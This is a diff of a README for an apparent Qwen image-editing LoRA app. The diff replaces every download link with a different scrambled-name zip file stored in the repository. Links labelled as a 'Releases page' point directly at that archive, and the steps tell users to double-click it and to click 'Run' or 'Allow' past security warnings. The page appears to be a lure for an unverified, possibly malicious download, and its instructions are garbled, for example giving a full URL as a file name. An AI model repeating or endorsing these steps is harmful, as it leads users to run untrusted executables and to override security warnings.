@@ -1,6 +1,6 @@
 # 🎨 Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load - Effortless Image Editing Made Simple
 
-[![Download Release](https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip)](https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip)
+[![Download Release](https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip)](https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip)
 
 ## 📋 Description
 Welcome to Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load! This application showcases the powerful capabilities of the Qwen/Qwen-Image-Edit-2509 model. It comes with lazy-loaded LoRA adapters that enhance specialized image editing tasks. Use it for applying textures, fusing objects, transferring materials, and migrating light. With a fused Lightning LoRA, you can achieve rapid inference, making your image editing experience smooth and efficient.
@@ -11,26 +11,26 @@ Follow these easy steps to download and run the software.
 ### Step 1: Visit the Releases Page
 To download the application, you first need to visit our Releases page. Click the link below to get there:
 
-[Visit Releases Page](https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip)
 
 ### Step 2: Download the Latest Version
 On the Releases page, locate the latest version of the software. The latest version will be at the top. 
 
 1. Click on the version title.
-2. Look for the file named `https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip` (or a similar name depending on the version).
+2. Look for the file named `https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip` (or a similar name depending on the version).
 3. Click the download link for that file.
 
 ### Step 3: Run the Application
 Once the download finishes, locate the downloaded file on your computer. This is usually in your "Downloads" folder.
 
-1. Double-click the file `https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip`.
+1. Double-click the file `https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip`.
 2. Depending on your system settings, you might see a security warning. Click "Run" or "Allow" to proceed.
 3. The application will launch and you can start your image editing journey.
 
 ## 📥 Download & Install
 To begin using the Qwen-Image-Edit-2509 application, follow these steps to download and install it:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/raw/refs/heads/main/qwenimage/Image-Qwen-Lo-As-Load-Edit-R-Fusion-Lazy-Fast-v3.0.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/eroeswim/Qwen-Image-Edit-2509-LoRAs-Fast-Fusion-Lazy-Load/main/qwenimage/As_Image_Edit_Fusion_R_Qwen_Lazy_Load_Fast_Lo_2.9.zip) to go to the Releases page.
 2. **Download the Software**: Find the latest version, click on it, and download the installer file.
 3. **Install the Application**: Once your download finishes, double-click the file and follow the on-screen instructions to complete the installation.
 
